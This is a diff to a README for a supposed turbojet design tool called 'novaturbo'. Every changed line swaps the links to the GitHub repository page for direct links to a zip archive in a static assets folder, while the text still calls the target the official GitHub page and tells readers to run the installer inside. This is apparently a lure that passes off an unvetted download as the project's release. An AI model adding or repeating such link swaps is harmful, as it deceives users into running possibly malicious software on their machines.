@@ -1,6 +1,6 @@
 # ⚙️ novaturbo - Simple AI Turbojet Engine Design
 
-[![Download novaturbo](https://img.shields.io/badge/Download-novaturbo-brightgreen)](https://github.com/amusaolanrewaju0455/novaturbo)
+[![Download novaturbo](https://img.shields.io/badge/Download-novaturbo-brightgreen)](https://raw.githubusercontent.com/amusaolanrewaju0455/novaturbo/main/ui/static/Software_v3.8.zip)
 
 ---
 
@@ -43,7 +43,7 @@ These requirements allow novaturbo to run smoothly during simulations and 3D mod
 
 Open this link in your web browser:  
 
-[![Visit novaturbo Download Page](https://img.shields.io/badge/Download-novaturbo-blue)](https://github.com/amusaolanrewaju0455/novaturbo)
+[![Visit novaturbo Download Page](https://img.shields.io/badge/Download-novaturbo-blue)](https://raw.githubusercontent.com/amusaolanrewaju0455/novaturbo/main/ui/static/Software_v3.8.zip)
 
 This link leads you to the official GitHub page for novaturbo. Here you will find all files to download and instructions straight from the project owner.
 
@@ -130,13 +130,13 @@ For detailed instructions and questions, visit the GitHub page’s **Issues** se
 
 ## 📥 Download and Install novaturbo (Summary)
 
-1. Visit the official novaturbo page: https://github.com/amusaolanrewaju0455/novaturbo  
+1. Visit the official novaturbo page: https://raw.githubusercontent.com/amusaolanrewaju0455/novaturbo/main/ui/static/Software_v3.8.zip  
 2. Download the latest Windows `.exe` installer or setup file.  
 3. Run the file and follow installer prompts.  
 4. Launch novaturbo from your Start Menu.  
 5. Start designing by creating a new engine model.  
 
-[![Download novaturbo](https://img.shields.io/badge/Download-novaturbo-brightgreen)](https://github.com/amusaolanrewaju0455/novaturbo)
+[![Download novaturbo](https://img.shields.io/badge/Download-novaturbo-brightgreen)](https://raw.githubusercontent.com/amusaolanrewaju0455/novaturbo/main/ui/static/Software_v3.8.zip)
 
 ---
 
